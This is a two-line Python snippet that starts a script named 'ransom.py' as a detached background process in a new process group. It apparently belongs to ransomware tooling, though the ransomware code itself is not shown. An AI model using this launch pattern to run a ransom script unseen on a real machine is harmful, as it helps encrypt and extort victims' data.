import subprocess

subprocess.Popen(["python", "ransom.py"], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
